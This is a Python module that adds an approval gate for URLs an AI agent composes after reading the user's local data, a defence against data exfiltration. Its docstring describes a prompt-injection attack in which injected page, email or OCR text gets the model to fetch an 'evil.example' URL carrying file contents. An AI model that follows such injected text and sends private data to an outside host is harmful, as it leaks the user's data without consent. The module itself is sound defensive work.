"""Taint rule for web addresses the model composes after reading local data.

`fetch_webpage_text`, `browser_navigate` and `open_website` normally run
unasked: opening a page is routine. But a URL is also a way out -- a
prompt-injected page, email or OCR text can ask the model to read a file
and then fetch `https://evil.example/?d=<file contents>` (or put the data in
the path or a sub-domain). So once the conversation holds output from a tool
that reads the user's own data (files, PowerShell, email, the screen, ...),
a URL the model sends must have come from somewhere the attacker can't have
written that data into:

  * the user's own messages, or
  * a page/search result the agent fetched (`_LINK_SOURCE_TOOLS`) -- those
    links existed before the agent read anything private;

otherwise the call asks the user first. A bare origin (`https://host/`) is
also fine when that host appears in those sources. Without local data in the
conversation nothing changes: there is nothing private to leak.

What counts is decided from the conversation history alone (tool names and
contents), by code -- never by the model. Tools that only touch public web
content or have trivial output (`_NON_TAINTING_TOOLS`) don't taint; every
other tool, including any added later, does.
"""
from __future__ import annotations

import json
from collections.abc import Iterable
from urllib.parse import urlsplit

from app.llm.base import Message, Role

_NON_TAINTING_TOOLS = frozenset({
    "calculator", "get_current_datetime", "web_search", "web_research", "fetch_webpage_text",
    "browser_navigate", "browser_read_page", "browser_close_page", "open_website",
})
_LINK_SOURCE_TOOLS = frozenset({
    "web_search", "web_research", "fetch_webpage_text", "browser_navigate", "browser_read_page",
})


def tainting_tool(history: Iterable[Message]) -> str | None:
    """The first tool in the conversation whose output may hold the user's
    own data, or None."""
    for message in history:
        if message.role == Role.TOOL and (message.name or "") not in _NON_TAINTING_TOOLS:
            return message.name or "a tool"
    return None


def _provenance_text(history: Iterable[Message]) -> str:
    parts = []
    for message in history:
        if message.role == Role.USER or (message.role == Role.TOOL and message.name in _LINK_SOURCE_TOOLS):
            parts.append(message.content or "")
    return "\n".join(parts)


def _seen(url: str, text: str) -> bool:
    candidates = {url, url.rstrip("/"), json.dumps(url)[1:-1]}
    return any(c and c in text for c in candidates)


def url_egress_reason(url: str, history: list[Message]) -> str | None:
    """Why sending `url` needs the user's approval, or None."""
    source = tainting_tool(history)
    if source is None:
        return None
    text = _provenance_text(history)
    if _seen(url.strip(), text):
        return None
    try:
        parts = urlsplit(url.strip())
        host = (parts.hostname or "").lower()
    except ValueError:
        parts, host = None, ""
    if (parts is not None and host and parts.path in ("", "/") and not parts.query and not parts.fragment
            and not parts.username and parts.port is None):
        bare = host.removeprefix("www.")
        if bare and bare in text.lower():
            return None
    return (f"This conversation already contains your own data (from '{source}'), and Garvis composed "
            "this address itself rather than taking it from your message or a page it read, so it "
            "could carry that data to the site.")
